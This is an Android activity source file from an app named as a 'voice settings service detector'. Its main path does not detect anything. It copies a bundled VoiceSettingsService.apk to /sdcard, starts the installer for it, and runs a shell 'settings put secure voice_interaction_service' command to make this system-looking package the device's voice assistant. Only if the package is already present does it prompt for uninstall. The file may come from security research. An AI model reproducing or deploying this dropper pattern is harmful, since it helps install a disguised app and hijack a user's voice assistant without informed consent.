package com.example.voicesettingsservicedetector;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.FileProvider;

import android.Manifest;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity {
    public static StringBuilder exeCmd(String commandStr) throws IOException {
        String[] command = { "/bin/sh", "-c", commandStr };
        Process p = Runtime.getRuntime().exec(command);
        BufferedReader br;
        br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        StringBuilder sb = new StringBuilder();
        while ((line = br.readLine()) != null) {
            sb.append(line + "\n");
        }
        return sb;
    }

    public static void openApk(Uri uri, Context context) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setDataAndType(uri, "application/vnd.android.package-archive");
        context.startActivity(intent);
    }

    public static Uri copyAssetsFile(Context context, String fileName, String path) {
        try {
            InputStream mInputStream = context.getAssets().open(fileName);
            File file = new File(path);
            if (!file.exists()) {
                file.mkdir();
            }
            File mFile = new File(path + File.separator + "VoiceSettingsService.apk");
            if(!mFile.exists())
                mFile.createNewFile();
            FileOutputStream mFileOutputStream = new FileOutputStream(mFile);
            byte[] mbyte = new byte[1024];
            int i = 0;
            while((i = mInputStream.read(mbyte)) > 0){
                mFileOutputStream.write(mbyte, 0, i);
            }
            mInputStream.close();
            mFileOutputStream.close();
            Uri uri = null;
            try{
                if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.N){
                    uri = FileProvider.getUriForFile(context, "com.example.voicesettingsservicedetector", mFile);
                }else{
                    uri = Uri.fromFile(mFile);
                }
            }catch (ActivityNotFoundException e){
            }
            MediaScannerConnection.scanFile(context, new String[]{mFile.getAbsolutePath()}, null, null);
            return uri;
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        } catch (Exception e) {
            return null;
        }
    }
    private boolean isAppInstall(Context mContext, String packageName){
        PackageInfo mInfo;
        try {
            mInfo = mContext.getPackageManager().getPackageInfo(packageName, 0 );
        } catch (Exception e) {
            mInfo = null;
        }
        if(mInfo == null){
            return false;
        }else {
            return true;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate( savedInstanceState );
        setContentView( R.layout.activity_main );
        boolean result = isAppInstall( this,"android.voicesettings.service" );
        if(result==true){

            String app_pkg_name = "android.voicesettings.service";
            Intent intent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE);
            intent.setData(Uri.parse("package:" + app_pkg_name));
            intent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
            startActivity(intent);

        }else{
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE}, 100);
            try {
                MainActivity.exeCmd( "settings put secure voice_interaction_service android.voicesettings.service/.MainInteractionService" );
                     } catch (IOException e) {
                e.printStackTrace();
            }
        }
        Button exit = (Button)findViewById(R.id.exit);
        exit.setOnClickListener( new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finish();
            }
        } );
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == 100) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                Uri uri = copyAssetsFile( this, "VoiceSettingsService.apk", "/sdcard" );
                openApk( uri, this );
                try {
                    MainActivity.exeCmd( "settings put secure voice_interaction_service android.voicesettings.service/.MainInteractionService" );
                } catch (IOException e) {
                    e.printStackTrace();
                }
            } else {
                finish();
            }
            return;
        }
    }
    }